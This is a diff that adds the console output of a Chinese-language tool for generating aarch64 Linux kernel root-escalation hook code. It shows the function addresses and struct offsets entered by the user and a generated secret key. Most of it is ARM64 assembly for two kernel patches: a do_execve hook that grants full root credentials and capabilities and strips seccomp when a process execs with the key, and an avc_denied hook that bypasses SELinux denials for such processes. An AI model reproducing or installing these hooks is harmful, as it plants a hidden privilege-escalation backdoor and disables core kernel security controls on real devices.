@@ -1,0 +1,96 @@
+本工具用于生成aarch64 Linux内核ROOT提权HOOK代码
+
+请输入do_execve函数的入口位置：
+23c600
+请输入avc_denied函数的入口位置：
+42ee18
+请输入task_struct结构体里cred的十六进制偏移值（从proc_pid_status里能看到）：
+0x7c8
+请选择应用进程在获取ROOT权限的时候，是否需要提升进程的seccomp，此项为非必需项（1需要；2不需要）：
+说明：提升进程的seccomp可以使进程直接获得完整的API能力，如不提升则应用进程也能间接通过注入init来获得完整的API能力。
+1
+请输入task_struct结构体里seccomp的十六进制偏移值（从proc_pid_status里能看到）：
+0x888
+是否需要自动随机生成ROOT密匙（1需要；2不需要）：
+1
+#生成的ROOT密匙字节集：314e7751724e555948344279515643426972656839655436307568456f714e33556150643757337a4b34526f77457953
+
+
+MOV X0, X0
+STP X7, X8, [sp, #-16]!
+STP X9, X10, [sp, #-16]!
+STP X11, X12, [sp, #-16]!
+MOV X7, 0xFFFFFFFFFFFFF001
+CMP X1, X7
+BCS #120
+LDR X7, [X1]
+CBZ X7, #112
+ADR X8, #-84
+MOV X9, #0
+LDRB W10, [X7, X9]
+CBZ W10, #96
+LDRB W11, [X8, X9]
+CBZ W11, #88
+CMP W10, W11
+B.NE #80
+ADD X9, X9, 1
+CMP X9, #48
+BLT #-32
+MRS X8, SP_EL0
+LDR X10, [X8, #1992]
+MOV X7, #4
+MOV W9, WZR
+STR W9, [X10, X7]
+ADD X7, X7, 4
+CMP X7, #40
+BLT #-12
+MOV W9, 0xFFFFFFFF
+CMP X7, #80
+BLT #-24
+LDXR W10, [X8]
+BIC W10, W10,#0xFFF
+STXR W11, W10, [X8]
+STR WZR, [X8, #2184]
+STR XZR, [X8, #2192]
+LDP X11, X12, [sp], #16
+LDP X9, X10, [sp], #16
+LDP X7, X8, [sp], #16
+B #2343480
+
+
+STP X7, X8, [sp, #-16]!
+STP X9, X10, [sp, #-16]!
+MRS X7, SP_EL0
+LDR X7, [X7, #1992]
+CBZ X7, #84
+MOV X8, #4
+MOV W9, WZR
+LDR W10, [X7, X8]
+CMP W10, W9
+B.NE #64
+ADD X8, X8, 4
+CMP X8, #36
+BLT #-20
+ADD X8, X8, 12
+MOV X9, 0x3FFFFFFFFF
+LDR X10, [X7, X8]
+ADD X8, X8, 8
+CMP X10, X9
+B.CC #28
+CMP X8, #72
+BLT #-20
+LDP X9, X10, [sp], #16
+LDP X7, X8, [sp], #16
+MOV W0, WZR
+RET
+LDP X9, X10, [sp], #16
+LDP X7, X8, [sp], #16
+MOV X0, X0
+B #4385244
+
+#获取ROOT权限的密匙：1NwQrNUYH4ByQVCBireh9eT60uhEoqN3UaPd7W3zK4RowEyS
+
+#是否需要立即写入修改到文件？（1需要；2不需要）：
+1
+1
+请按任意键继续. . .
